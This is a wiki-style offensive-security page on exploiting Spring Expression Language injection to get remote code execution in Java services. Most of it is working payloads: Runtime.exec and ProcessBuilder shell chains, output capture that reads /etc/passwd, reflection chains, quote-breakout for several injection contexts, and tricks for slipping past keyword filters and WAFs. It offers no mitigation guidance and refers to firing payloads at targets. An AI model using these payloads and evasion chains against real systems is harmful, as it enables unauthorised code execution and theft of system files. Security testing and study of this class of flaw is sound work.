---
title: "SpEL injection: Spring Expression Language from user input to Java RCE"
description: Exploiting Spring Expression Language sinks, parseExpression on concatenated input, @Value bindings, Spring Security annotations, and rule engines, where T() type references and constructors reach reflection and Runtime.exec.
keywords:
  - SpEL
  - SpEL injection
  - Spring Expression Language
  - expression injection
  - Spring
  - remote code execution
---

# SpEL injection

**Spring Expression Language (SpEL)** is the expression engine woven through the Spring ecosystem: `@Value` property resolution, Spring Security method annotations, Spring Integration routing, Spring Data projections, and any application code that calls `ExpressionParser.parseExpression(...)`. SpEL is a full expression language with access to Java types, constructors, and methods. When a value that crosses a trust boundary is parsed and evaluated as SpEL, the attacker gains code execution inside the JVM, **remote code execution** in the service account's context.

## Overview

The archetypal sink concatenates user input into a parsed expression:

```java
// name comes from an HTTP request
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression("'Hello ' + '" + name + "'");
String out = (String) exp.getValue();
```

The developer intended string interpolation. The parser, however, evaluates the whole expression, so a `name` of `' + T(java.lang.Runtime).getRuntime().exec('id') + '` closes the literal and injects a type reference that reaches the runtime. The data-to-code crossing is the same as every injection class: the grammar treats `T(...)`, `new`, and method calls as syntax, and the attacker controls the string.

SpEL also appears in less obvious places. Any framework feature that accepts an expression from configuration, a header, a parameter name, or a persisted field is a candidate when that value originates with the user.

## The expression primitives

SpEL gives the attacker a rich set of operations once evaluation is reached:

| Construct | Example | Effect |
|-----------|---------|--------|
| Arithmetic / literal | `7*7` | Confirmation oracle |
| Type reference | `T(java.lang.System)` | Resolve a class for static access |
| Static method | `T(java.lang.System).getProperty('user.dir')` | Call a static method |
| Constructor | `new java.lang.ProcessBuilder('id')` | Instantiate arbitrary classes |
| Method call | `.getRuntime().exec('id')` | Invoke instance methods |
| Bean reference | `@beanName` | Reach a Spring-managed bean in context |
| Variable | `#root`, `#this` | Reference the evaluation context |

The `T(...)` type operator is the signature SpEL primitive: it resolves a fully qualified class so that static methods and constructors become reachable. That single feature turns a benign expression sink into an execution primitive.

## Exploitation

### Step 1, confirm evaluation

Submit arithmetic and look for the computed result:

```
7*7
${7*7}
#{7*7}
```

A reflected `49` confirms SpEL evaluated the input. The `#{...}` form is Spring's template-expression marker; `${...}` is property-placeholder syntax that is sometimes chained into SpEL. Which wrapper fires identifies the sink type.

### Step 2, reach the runtime

The canonical SpEL execution chains use `T()` for a static accessor or `new` for a constructor:

```
# Runtime via type reference
T(java.lang.Runtime).getRuntime().exec('id')

# ProcessBuilder constructor, with argument list
new java.lang.ProcessBuilder(new String[]{'/bin/sh','-c','id'}).start()
```

For a target where arguments must be split (spaces filtered, or a shell needed), pass an array to `ProcessBuilder` as above and let it spawn `sh -c`.

### Step 3, capture output

When the expression's value is reflected, read the process stream so the result returns inline:

```
new java.util.Scanner(
  T(java.lang.Runtime).getRuntime().exec(new String[]{'cat','/etc/passwd'}).getInputStream()
).useDelimiter('\\A').next()
```

`Scanner` with the `\A` delimiter slurps the whole stream into a single token, which becomes the expression result. When nothing is reflected, drive a blind oracle: a timing delay (`T(java.lang.Thread).sleep(10000)`), an out-of-band DNS/HTTP callback, or a write to a web-served path.

### Reflection and classloader chains

Where direct `T(java.lang.Runtime)` is filtered, reflection rebuilds the same capability from parts:

```
T(java.lang.Class).forName('java.lang.Runtime')
  .getMethod('exec', T(java.lang.String))
  .invoke(T(java.lang.Runtime).getMethod('getRuntime').invoke(null), 'id')
```

Another common route loads and defines bytecode or instantiates a scripting engine (`javax.script.ScriptEngineManager`) to run JavaScript that shells out, useful when a WAF blocks the obvious `Runtime`/`ProcessBuilder` tokens.

## Injection contexts

Where the input lands dictates the breakout needed:

- **Concatenated into a literal**, `'Hello ' + 'INPUT'`, close the quote first: `' + T(...)... + '`.
- **Whole-string expression**, the input *is* the expression, inject the payload directly, no breakout.
- **Spring Security annotation / rule**, a value interpolated into `@PreAuthorize("hasRole('" + role + "')")` style strings reaches SpEL with the same quote-breakout technique.
- **`@Value` / property placeholder**, a user-controlled property that feeds `@Value("#{...}")` evaluates at binding time.

Identifying the quoting context is the first step; a payload that ignores it is passed as inert text.

## Filter evasion

SpEL's flexibility defeats keyword blocklists because the parser normalizes the expression after the filter inspects it:

- **String concatenation to rebuild keywords:** `T(java.lang.Ru + ntime)` is not valid, but `T(java.lang.Class).forName('java.lang.Run'+'time')` assembles the name at runtime.
- **Reflection in place of direct calls:** route through `forName`/`getMethod`/`invoke` so no blocked method token appears literally.
- **Alternate execution sinks:** `ScriptEngineManager`, `ProcessBuilder`, and `Runtime` are interchangeable; blocking one leaves the others.
- **Marker swapping:** if `#{...}` is filtered, test `${...}` chaining or a bare expression depending on the sink.

## Tools

- **[Burp Suite](https://portswigger.net/burp)** (Repeater, Intruder) for arithmetic oracles and staged payload delivery.
- **[interactsh](https://github.com/projectdiscovery/interactsh)** / Burp Collaborator for out-of-band confirmation on blind sinks.
- **[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)** SpEL payload collections for output-capture and reflection chains.
- A local Spring test harness to validate a payload against the exact SpEL evaluation mode (`SimpleEvaluationContext` vs `StandardEvaluationContext`) before firing at the target.

## References

- [CWE-917: Expression Language Injection](https://cwe.mitre.org/data/definitions/917.html)
- [Spring Framework: Spring Expression Language (SpEL) reference](https://docs.spring.io/spring-framework/reference/core/expressions.html)
- [OWASP: Expression Language Injection](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
- [PayloadsAllTheThings: SpEL injection](https://github.com/swisskyrepo/PayloadsAllTheThings)
